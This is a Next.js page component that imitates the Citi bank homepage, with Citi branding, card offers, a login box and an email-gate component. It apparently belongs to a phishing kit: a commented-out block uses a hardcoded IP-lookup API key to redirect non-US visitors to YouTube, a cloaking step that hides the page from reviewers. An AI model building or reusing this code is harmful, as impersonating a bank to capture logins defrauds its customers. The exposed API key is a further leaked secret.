"use client";

import EmailNotification from "@/components/layout/EmailNotification";
import Footer from "@/components/layout/Footer";
import Header from "@/components/layout/Header";
import Nav from "@/components/layout/Nav";
import SectionCard from "@/components/layout/SectionCard";
import InfoCard from "@/components/ui/InfoCard";
import LoginBox from "@/components/ui/LoginBox";
import Image from "next/image";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

const Page = () => {
  const [mounted, setMounted] = useState(false);
  const router = useRouter();

  // useEffect(() => {
  //   fetch(
  //     "https://api.ipregistry.co/?key=ira_rvdSzWTajk0lZZ4a8r0jjlMyKNGPQG2BTKvw"
  //   )
  //     .then(function (response) {
  //       return response.json();
  //     })
  //     .then(function (payload) {
  //       const countryCode = payload.location.country.code;
  //       if (countryCode !== "US") {
  //         router.push("https://www.youtube.com");
  //       }
  //     });
  // }, []);

  return (
    <>
      {!mounted ? (
        <EmailNotification setMounted={setMounted} />
      ) : (
        <div>
          <Header />
          <Nav />

          <section className="flex-between px-5 w-full bg-[url('/images/Citi-futuristic-angles-bg-compressed.jpg')] pt-5 pb-16 bg-cover max-md:flex-col max-md:items-center max-md:gap-8">
            <div className="col-flex max-w-[400px]">
              <div>
                <p className="text-lg font-light">CITI STRATA ELITE℠ CARD</p>
                <h1 className="text-[42px] font-extrabold text-sec max-md:text-3xl">
                  80,000 bonus points*
                </h1>
                <p className="text-base text-[#333] mt-2">
                  Unlock extraordinary value in shopping, dining, travel and
                  more. Terms apply.
                </p>

                <div className="w-[190px] mt-6">
                  <button className="cursor-pointer w-full py-3 bg-primary rounded-lg font-bold text-white hover:!bg-[#054e7b]">
                    Apply Now
                  </button>
                  <button className="cursor-pointer w-full my-3 text-primary rounded-lg font-bold text-white underline">
                    *Additional Information
                  </button>
                </div>
              </div>
            </div>

            <div className="max-md:hidden">
              <Image
                src={"/images/HP25_STRATA_ELT_July_APLY_Hero.png"}
                alt="Card"
                width={320}
                height={200}
                className="object-contain"
              />
            </div>

            <div>
              <LoginBox />
            </div>

            <div className="max-md:block hidden">
              <Image
                src={"/images/HP25_STRATA_ELT_July_APLY_Hero.png"}
                alt="Card"
                width={320}
                height={200}
                className="object-contain"
              />
            </div>
          </section>

          <section className="mx-6 max-md:max-2 border border-gray-300 rounded-2xl mt-[-30px] bg-white flex-center p-2">
            <Image
              src={"/images/hero-card.jpg"}
              alt="Card"
              width={1200}
              height={200}
              className="object-contain"
            />
          </section>

          <section className="flex-evenly mt-13 max-md:flex-col max-md:items-center max-md:gap-8 px-5">
            <InfoCard
              subTitle={"CITI® SAVINGS ACCOUNTS"}
              title={"Save More, Earn More"}
              image={"HP_7591_Module_3UP.jpg"}
              details={
                "At Citi, start saving with ease and grow with confidence. Member FDIC."
              }
            />
            <InfoCard
              subTitle={""}
              title={"How Does 0% Intro APR on a Credit Card Work"}
              image={"Zero_APR_3UP.jpg"}
              details={
                "Everything you need to know about how 0% intro APR credit cards work and how to make sure you avoid paying interest."
              }
            />
            <InfoCard
              subTitle={"CITI® / AADVANTAGE® CREDIT CARDS"}
              title={"Explore Citi® / AAdvantage® Credit Cards"}
              image={"AAStack_560x315_noangle.jpg"}
              details={
                "Whether you're a frequent flyer or first—time passenger, Citi has an airline rewards credit card to meet your travel needs."
              }
            />
          </section>

          <section className="mt-12">
            <SectionCard
              bgColor={"#c5e4f3"}
              image={"HP_7430_M1M7_Image.jpg"}
              title={"Simplified Banking"}
              subTitle={"CITI® CHECKING ACCOUNTS"}
              details={
                "Citi mobile banking allows you to manage your money and pay friends — all while on-the-go. Member FDIC."
              }
              btnText={"Learn More"}
              reverse={false}
            />
            <SectionCard
              bgColor={"#f0f5f7"}
              image={"HP_10077_Citi_Shop.jpg"}
              title={"Shop, Save and Make a Splash"}
              subTitle={"INTRODUCING THE CITI SHOP℠ PROGRAM"}
              details={
                "Add the new, free Citi Shop browser extension that finds offers and coupons at over 5,000 online merchants"
              }
              btnText={"Discover Citi Shop"}
              reverse={true}
            />
            <SectionCard
              bgColor={"#fffff"}
              image={"HP_10592__GPA_HP24_Cnt_LRN_LAM_SvgsHab.png"}
              title={"Need Help Hitting Your Money Goals?"}
              subTitle={"LIFE AND MONEY BY CITI"}
              details={"Here are smart tips for successful saving."}
              btnText={"Learn More"}
              reverse={false}
            />
          </section>

          <Footer />
        </div>
      )}
    </>
  );
};

export default Page;
